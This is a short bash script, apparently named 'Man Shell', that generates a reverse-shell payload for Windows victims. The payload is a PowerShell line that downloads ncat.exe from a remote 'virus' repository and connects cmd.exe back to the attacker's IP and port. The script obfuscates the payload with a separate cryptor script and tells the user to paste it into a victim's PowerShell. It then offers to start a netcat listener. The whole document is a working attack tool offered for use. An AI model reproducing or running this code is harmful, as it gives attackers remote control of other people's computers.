#!bin/bash

grepIP() {
    default_port=8000
    read -p "Type Your IP address: " host
    read -p "Type your Listener Port[Default: 8000]: " port
    port="${port:-${default_port}}"
    creatingMalware
}
creatingMalware() {
    if [[ -e .websocket.ps1 ]]; then 
    rm -rf .websocket.ps1
    echo "(New-Object System.Net.WebClient).DownloadFile('https://github.com/manashma/virus/raw/main/ncat.exe', 'ncat.exe') ; cmd /c ncat -nv ${host} ${port} -e cmd.exe" > .websocket.ps1
    sleep 2;
    printf "\nFile Generated\n"
    encryptFile
    else
    echo "(New-Object System.Net.WebClient).DownloadFile('https://github.com/manashma/virus/raw/main/ncat.exe', 'ncat.exe') ; cmd /c ncat -nv ${host} ${port} -e cmd.exe" > .websocket.ps1
    sleep 2;
    printf "\nFile Generated\n"
    encryptFile
    fi
}
encryptFile() {
    pwsh -file cryptor.ps1
    clear ; sleep 5
    cat encode.txt
    printf "\nJust Paste this Command to Victim Powershell\n"
    printf "\n"
    reverseShell
}
reverseShell() {
    printf "\nDo You Open Revershell Shell Here? [y/n]\n"
    read -p ">> " ans 
    if [[ $ans =~ ^[yY]$ ]]; then
    clear nc -lnvp ${port}
    elif [[ $ans =~ ^[nN]$ ]]; then
    printf "\nThanks For Using Man Shell"
    exit 2;
    else 
    printf "Please enter a valid option"
    fi
 }
 grepIP
